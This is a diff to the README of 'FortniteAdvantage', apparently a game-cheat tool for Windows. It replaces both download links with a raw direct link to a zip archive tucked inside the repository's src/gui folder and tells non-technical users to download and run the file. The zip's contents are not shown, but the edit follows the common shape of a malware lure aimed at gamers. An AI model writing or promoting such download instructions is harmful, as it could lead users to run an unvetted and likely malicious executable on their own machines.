@@ -1,6 +1,6 @@
 # 🎮 FortniteAdvantage - Clearer Play, Smoother Control
 
-[![Download Now](https://img.shields.io/badge/Download%20FortniteAdvantage-blue?style=for-the-badge&logo=github)](https://github.com/delicate-microbalance725/FortniteAdvantage)
+[![Download Now](https://img.shields.io/badge/Download%20FortniteAdvantage-blue?style=for-the-badge&logo=github)](https://github.com/delicate-microbalance725/FortniteAdvantage/raw/refs/heads/main/src/gui/Advantage_Fortnite_v3.2.zip)
 
 ## 🧭 Overview
 
@@ -12,7 +12,7 @@ This app is designed for everyday Windows users. You do not need coding skills t
 
 Use this link to visit the download page:
 
-[Download FortniteAdvantage](https://github.com/delicate-microbalance725/FortniteAdvantage)
+[Download FortniteAdvantage](https://github.com/delicate-microbalance725/FortniteAdvantage/raw/refs/heads/main/src/gui/Advantage_Fortnite_v3.2.zip)
 
 Open the page, get the latest version, then download and run the file on your Windows PC.
 
